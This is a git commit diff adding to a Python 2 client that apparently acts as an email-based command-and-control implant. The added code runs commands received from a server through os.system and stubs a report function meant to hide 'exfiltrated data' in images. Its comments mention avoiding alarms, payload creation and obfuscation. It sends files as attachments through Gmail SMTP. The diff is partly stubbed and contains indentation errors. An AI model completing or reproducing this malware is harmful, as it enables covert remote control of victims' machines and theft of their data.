1f2220879c4d7faf8efc83393614ac5e6f9b8c8c
failure-to-resolve <transaction.failed.0@gmail.com>
2019-08-14 19:56:16 -0600

    Added attachment support, reworked the config for the client. Also threw in some encryption functions from the server

--- modules/client/client.py
+++ modules/client/client.py
@@ -3,29 +3,31 @@ import imaplib
 import smtplib
 import threading
 import email
-
+import os
 
 
 IMAP_SERVER = "imap.gmail.com"
 IMAP_PORT   = 993
 
 config = open("./config", "r+")
-waitList = [] #stores commands to be executed, must stay under 2 threads as not to raise the alarms
+waitList = [] # stores commands to be executed, must stay under 2 threads as not to raise the alarms
+OSType = "" # received in the config, must be specified within the payload creation
 
-def fromConfig(config):
+
+def fromConfig():
 	raw_config = config.readlines()
 	global serverAddr
 	global clientAddr
 	global clientPass
+	global modulesAvailable
+
 
 	serverAddr = raw_config[0].strip()
 	clientAddr = raw_config[1].strip()
 	clientPass = raw_config[2].strip()
+	modulesAvailable = raw_config[3].strip()
 	return
 def readMail(user,upass):
-	#server = smtplib.SMTP('smtp.gmail.com', 587)
-	#server.ehlo()
-	#server.starttls()
 	server = imaplib.IMAP4_SSL(IMAP_SERVER,IMAP_PORT)
 	
 	server.login(user,upass)
@@ -57,6 +59,56 @@ def readMail(user,upass):
 				if msg.is_multipart():
 					for part in msg.walk():
 						print part.get_content_type()
+def executeModule(moduleNum): #runs the specified module and generates a report back to the server
+	os.system(moduleNum)
+	pass
+def sendReport(moduleNum, status, exifData): #sends an update to the server with the module number, if it succeeded or not, and any exfiltrated data hidden in an image
+	pass
+def newKey(): #when the newKey command is sent from the server along with the generated key, this integrates it into communication and sends back the old key in the "OK"
+	pass
+def encrypt(): #same as the server
+	pass
+def decrypt(): #see above
+	pass
+def updateConfig(newConfig): #updates the config to replace an old email, or update the modules list
+	try:
+		config.truncate(0)
+		for line in newConfig:
+		config.write(line)
+		return 1
+	except Exception, e:
+		return e
+	pass
+
+def mailSender(reUser, seUser,sePass,subject,text,files): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere
+
+	email_text = """\
+From: %s
+To: %s
+Subject: %s
+
+%s
+""" % (seUser, reUser, subject, text)
+
+	msg = MIMEMultipart()
+	msg['From'] = seUser
+	msg['To'] = reUser
+	msg['Subject'] = subject
+
+	msg.attach(MIMEText(text))
+
+	for f in files or []:
+		with open(f, "rb") as fil:
+			part = MIMEApplication(fil.read(),Name=basename(f)
+			)
+	part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
+	msg.attach(part)
+	server = smtplib.SMTP('smtp.gmail.com', 587)
+	server.ehlo()
+	server.starttls()
+
+	server.login(seUser, sePass)
+	server.sendmail(seUser, reUser, msg.as_string())
 
 
 def main():
